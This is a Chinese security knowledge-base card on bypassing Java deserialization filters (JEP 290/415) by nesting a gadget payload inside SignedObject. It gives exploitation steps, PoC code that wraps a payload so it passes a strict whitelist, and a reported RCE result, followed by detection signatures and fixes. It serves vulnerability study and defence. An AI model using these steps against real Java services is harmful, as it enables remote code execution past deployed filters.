---
id: web-java-deserialization-jdk-signedobject-nested-stream-filter-bypass
title: SignedObject 嵌套 ObjectInputStream 绕过反序列化过滤器
type: scenario
domain: web
path: web/java/deserialization/jdk
technique: nested-objectinputstream-filter-bypass
tags:
- java
- deserialization
- objectinputfilter
- signedobject
- nested-stream
- jep290
- jep415
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: JDK 9+（JEP 290）；JDK 17+（JEP 415）；原文测试 OpenJDK 21.0.11-ea
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:41:50+08:00'
  notes: 已对照原文与截图 8-15、37-44 核对：外层 setObjectInputFilter 不传播到 readObject 内 new ObjectInputStream、SignedObject.getObject 内部无过滤器、严格白名单仍还原 BadAttributeValueExpException 均实测；未验证点：SignedObject 内层换 CC6 的端到端 RCE 原文未跑，黑名单+CC6 成功案例用的是自定义 NestingWrapper（img/41-43），卡片 variants 已说明；affected_versions 为原文 JEP290/JEP415 版本脉络+实测环境，非 CVE 区间
url: /docs/web/java/deserialization/jdk/web-java-deserialization-jdk-signedobject-nested-stream-filter-bypass/
draft: false
kb_aliases:
- 嵌套反序列化过滤器绕过
- SignedObject getObject 绕过
- JEP 290 绕过
- JEP 415 绕过
- 双层反序列化
---

## 一句话结论

`ObjectInputFilter` 绑定在 `ObjectInputStream` 实例上而非序列化数据流本身；当一个可序列化对象的 `readObject()` 内部新建 `ObjectInputStream` 反序列化嵌套字节时，外层过滤器不会传播，内层可加载被外层明确拒绝的类，最终可执行完整 gadget 链。

## 原理

- JEP 290 的过滤器通过 `ois.setObjectInputFilter()` 作用于单个 `ObjectInputStream`；`jdk.serialFilter` 是 JVM 全局过滤器。`ObjectInputStream` 构造函数只向过滤器工厂要一个初始过滤器（默认工厂直接返回 JVM 全局过滤器），它不知道调用它的外层流设置了什么。
- 因此存在架构性盲区：外层流设置严格白名单/黑名单，并不影响 `readObject()` 内部 `new ObjectInputStream(nestedBytes)` 创建的实例；新实例的过滤器由全局配置决定，通常为空或很宽松。
- `java.security.SignedObject` 是 JDK 原生可利用载体：构造时把任意 `Serializable` 对象序列化进 `content` 字段；`getObject()` 内部执行 `new ObjectInputStream(new ByteArrayInputStream(content)).readObject()`，且不设置任何过滤器。`SignedObject` 本身属于 `java.security` 包，常被白名单/黑名单放行。
- `SignedObject.readObject()` 不会自动调用 `getObject()`，需要 Getter 调用链触发，例如 `BeanComparator("object")`、Jackson `POJONode`、`InvokerTransformer` 等；反序列化时由 `compare`/`toString`/`getValue` 等路径调用 `getObject()`，内层 payload 即被无过滤反序列化。
- 自定义载体同理：只要目标 classpath 上存在“`readObject()` 内新建 `ObjectInputStream`”的类，且该类未被过滤器拒绝，即可作为嵌套跳板。

## 触发条件

- 应用对不可信数据调用 `ObjectInputStream.readObject()`。
- 过滤器只通过 `setObjectInputFilter()` 作用于外层流，未注册合并全局过滤器的 `SerialFilterFactory`（JEP 415）。
- `java.security.SignedObject`（或目标已有的嵌套反序列化类）未被过滤器拒绝；黑名单末尾常用 `*` 放行未列举类，正好留下口子。
- 内层 payload 所需的 gadget 依赖存在于 classpath（如 Commons Collections 3.2.1）。

## 利用步骤

1. 用 ysoserial 等生成内层完整 gadget payload（如 CommonsCollections6）。
2. 用 `SignedObject` 构造器把内层对象序列化进 `content`（构造器会自动 `ObjectOutputStream.writeObject`）。
3. 序列化 `SignedObject`，外层过滤器只会看到 `java.security.SignedObject` 及其基础类，通常放行。
4. 把序列化数据发给目标；目标反序列化 `SignedObject` 后，由 Getter 调用链触发 `getObject()`。
5. `getObject()` 内部新建无过滤器 `ObjectInputStream`，内层 CC6 被反序列化并执行，达到 RCE。
6. 若目标没有 `SignedObject` 触发链，可改用目标 classpath 上已有的嵌套反序列化类（其 `readObject()` 内新建 OIS）作为外层载体。

## PoC

内层 payload 包装（`innerEvil` 可为 ysoserial 生成的 CC6 对象，示例用 JDK 类演示过滤器放行差异）：

```java
import java.io.*;
import java.security.*;

Object innerEvil = /* 任意被外层过滤器拒绝的对象/gadget */;
KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
KeyPair kp = kpg.generateKeyPair();

SignedObject so = new SignedObject(
    (Serializable) innerEvil, kp.getPrivate(),
    Signature.getInstance("SHA256withDSA"));

ByteArrayOutputStream baos = new ByteArrayOutputStream();
try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
    oos.writeObject(so);
}
byte[] payload = baos.toByteArray();
```

外层严格白名单仍放行并触发：

```java
ObjectInputFilter strict = ObjectInputFilter.Config.createFilter(
    "java.security.SignedObject;java.lang.*;java.security.*;java.base/*;!*");

try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload))) {
    ois.setObjectInputFilter(strict);
    SignedObject restored = (SignedObject) ois.readObject(); // 外层通过
    Object inner = restored.getObject();                     // 内层无过滤器
}
```

实测输出（原文）：外层仅允许 `SignedObject` 与 `java.base` 类，嵌套反序列化仍成功还原 `javax.management.BadAttributeValueExpException`；把内层换成 CC6 后，黑名单端点返回成功并在目标上生成 `/tmp/rce_proof`。

## 变体与关联

- 变体（自定义载体）：目标 classpath 上任何 `readObject()` 内 `new ObjectInputStream` 的类都可替代 `SignedObject`；原文用 `NestingWrapper` 演示，外层黑名单过滤 `functors.**` 时，内层 CC6 仍执行成功。
- 变体（触发方式）：`SignedObject.getObject()` 可由 `BeanComparator`、`POJONode`、`InvokerTransformer` 等 Getter/反射链触发，不要求业务代码显式调用。
- 关联：JEP 415 的 `setSerialFilterFactory` + `ObjectInputFilter.merge(global, requested)` 可堵住该缺口，因为它会在每个新 OIS 构造时调用工厂；只设置 JVM 全局过滤器而不设置工厂，无法继承外层流策略。
- 关联卡片：[[web-java-deserialization-external-xalan-templatesimpl-sink]]、[[web-java-deserialization-h2-jdbc-init-create-alias-rce]]

## 检测与防御

- 检测：序列化流中出现 `java.security.SignedObject`，且其 `content` 字段为另一段完整序列化流（魔数 `AC ED 00 05` 嵌套出现）。
- 检测：反序列化过程中同一线程连续构造多个 `ObjectInputStream`；`readObject` 内出现新的流对象。
- 检测：目标 classpath 上存在自定义“嵌套反序列化”类，且该类出现在不可信输入中。
- 修复：注册 `ObjectInputFilter.Config.setSerialFilterFactory((cur, req) -> ObjectInputFilter.merge(globalFilter, req))`，让所有新建 OIS（含嵌套）都继承全局策略；`setSerialFilterFactory` 每个 JVM 只能调用一次，需在启动早期完成。
- 加固：白名单中不要放行 `java.security.SignedObject` 及任何内部会新建 OIS 的类；从根本上避免对不可信数据使用 Java 原生反序列化，改用 JSON/Protobuf。
